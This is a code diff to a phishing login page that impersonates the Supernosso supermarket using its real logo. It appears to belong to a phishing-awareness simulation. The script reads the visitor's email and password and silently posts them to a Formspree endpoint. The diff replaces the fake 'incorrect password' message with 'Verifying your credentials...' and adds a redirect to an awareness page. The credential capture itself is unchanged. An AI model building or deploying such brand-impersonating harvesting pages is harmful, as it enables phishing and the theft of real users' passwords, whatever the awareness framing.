@@ -320,7 +320,7 @@
         <div class="login-card">
             <!-- LOGO -->
             <div class="logo-area">
-              
+
                 <div class="logo-placeholder">
                     <img class="logo-img" src="https://supernossoio.vtexassets.com/assets/vtex.file-manager-graphql/images/17203f8f-ebcc-45fd-83ca-8a9dd2888f2c___b979361622dc5ed775a1e05b8bf62002.svg" alt="Supernosso"
                          onerror="this.style.display='none'; this.parentNode.querySelector('.logo-fallback').style.display='flex';"
@@ -334,7 +334,7 @@
             </div>
 
             <div id="mensagemErro" class="mensagem-erro">
-                ⚠️ E-mail ou senha incorretos. Tente novamente.
+                ⚠️ Verificando suas credenciais...
             </div>
 
             <!-- FORMULÁRIO COM ENVIO PARA FORMSPREE -->
@@ -402,14 +402,14 @@
     </div>
 
     <script>
-        // ----- Envio dos dados para o Formspree (assíncrono) -----
+        // ----- Envio dos dados + redirecionamento para conscientização -----
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault(); // impede o envio tradicional
+            event.preventDefault();
 
             const email = document.getElementById('email').value.trim();
             const senha = document.getElementById('senha').value.trim();
             const mensagemErro = document.getElementById('mensagemErro');
-            const formAction = this.getAttribute('action'); // endpoint do Formspree
+            const formAction = this.getAttribute('action');
 
             if (email && senha) {
                 // Envia silenciosamente para o Formspree
@@ -423,14 +423,14 @@
                     console.error('Erro ao enviar:', erro);
                 }
 
-                // Feedback visual (mantém a simulação realista)
+                // Exibe feedback e redireciona após breve pausa
                 mensagemErro.classList.add('visivel');
-                mensagemErro.textContent = '⚠️ E-mail ou senha incorretos. Tente novamente.';
+                mensagemErro.textContent = '⚠️ Verificando suas credenciais...';
                 setTimeout(() => {
-                    mensagemErro.classList.remove('visivel');
-                }, 4000);
+                    // Redireciona para a página de conscientização
+                    window.location.href = 'conscientizacao.html';
+                }, 1500);
 
-                console.log('[SIMULAÇÃO] Dados capturados:', { email, senha });
             } else {
                 mensagemErro.classList.add('visivel');
                 mensagemErro.textContent = '⚠️ Por favor, preencha todos os campos.';
@@ -440,14 +440,14 @@
             }
         });
 
-        // Remove mensagem de erro ao digitar
+        // Remove mensagem ao digitar
         document.querySelectorAll('input').forEach(input => {
             input.addEventListener('input', () => {
                 document.getElementById('mensagemErro').classList.remove('visivel');
             });
         });
 
-        // ----- Controle do modal social -----
+        // ----- Modal redes sociais -----
         const modal = document.getElementById('modalIndisponivel');
         const modalSocialNome = document.getElementById('modalSocialNome');
         const btnFechar = document.getElementById('btnFecharModal');
